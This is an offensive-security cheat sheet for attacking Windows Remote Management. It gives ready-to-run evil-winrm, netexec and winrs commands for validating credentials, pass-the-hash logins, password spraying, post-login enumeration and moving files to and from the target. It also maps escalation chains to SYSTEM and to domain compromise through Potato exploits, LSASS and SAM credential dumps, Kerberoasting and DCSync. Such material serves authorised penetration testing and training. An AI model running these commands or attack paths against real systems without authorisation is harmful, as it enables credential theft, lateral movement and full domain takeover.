# WinRM Battle Card

## What to Check First
```
1. PORT 5985? (HTTP) or 5986? (HTTPS) → nmap -sV -p 5985,5986 target
2. VALIDATE CREDS → evil-winrm -i target -u user -p pass
3. PTH → evil-winrm -i target -u user -H hash
4. NETEXEC → netexec winrm target -u user -p pass
```

## High-Value Findings
- **WinRM access as local admin** → Full host control
- **WinRM access as domain user** → AD enumeration + lateral movement
- **SeImpersonatePrivilege enabled** → Potato exploit → SYSTEM
- **Password spray success on WinRM** → Valid creds confirmed
- **Domain admin via WinRM** → Domain compromise

## Immediate Commands
```
# Check access with creds
evil-winrm -i target -u user -p pass

# Pass-the-Hash
evil-winrm -i target -u user -H ntlmhash

# Password spray
netexec winrm target -u users.txt -p passwords.txt
netexec winrm target -u user -p pass --local-auth  # Local account

# Post-exploitation via WinRM
evil-winrm -i target -u user -p pass  # Then:
  whoami /priv                    # Check privileges
  whoami /groups                  # Check group membership
  net localgroup administrators   # Check local admins
  systeminfo                      # OS/build info
  netstat -ano                    # Network connections
  
# Upload/download with evil-winrm
upload localfile remotepath
download remotefile localpath

# Execute via WinRM
winrs -r:target -u:user -p:pass cmd
```

## Common Attack Paths
```
PASSWORD SPRAY → WinRM User → Shell → Enumerate → Lateral
LOCAL ADMIN PTH → WinRM → SYSTEM → LSASS Dump → Domain Creds
DOMAIN USER → WinRM → BloodHound → Kerberoast → DA Path
WINRM + SEIMPERSONATE → Potato → SYSTEM → SAM Dump
WINRM DOMAIN ADMIN → Full Domain Control → DCSync
```

## Escalation Paths
- **WinRM + local admin** → CMD/SYSTEM → LSASS dump → Domain creds
- **WinRM + SeImpersonate** → PrintSpoofer/JuicyPotato → SYSTEM
- **WinRM + SeAssignPrimaryToken** → Pipe abuse → SYSTEM
- **WinRM + WinRM domain admin session** → DCSync

## When to Stop
- No creds available → Don't waste time. Try password spray or get creds first
- If WinRM access but no priv escalation possible → Move to other targets
- WinRM blocked by firewall (5985 filtered) → Try RDP, SMB exec, or SSH

## Common Mistakes
- Forgetting to check `evil-winrm -H` (hash) instead of password
- Not checking `whoami /priv` on login (missed SeImpersonate!)
- Assuming WinRM = full access (check if admin or user)
- Not trying `--local-auth` flag for local accounts
- Forgetting to upload SharpHound.ps1 via evil-winrm for BloodHound
